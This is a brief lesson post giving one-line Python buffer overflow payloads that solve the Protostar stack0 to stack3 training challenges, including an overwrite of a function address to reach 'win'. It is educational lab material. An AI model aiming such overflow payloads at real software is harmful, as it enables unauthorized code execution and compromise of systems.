---
title:   Buffer Overflow 101
classes: wide
header:
  teaser: /img/postcover/cover2.png
ribbon: blue
categories:
  - Lesson
  - TestCategory
toc: true
---

# Protostar

## stack0
https://exploit.education/protostar/stack-zero/

\`python -c "print('a'\*65)"\` | ./stack0  

## Stack1
./stack1 \`python -c "print('a'\*64+'dcba')"\`

## Stack2
export GREENIE= \`python -c "print('a'\*64+'\\x0a\\x0d\\x0a\\x0d')"\`
cause the stack works backwords
./stack2

## Stack3
objdump -t stack3
check the address of the "win" function and use it
\`python -c "print('a'\*64+'\\x24\\x84\\x04\\x08')"\`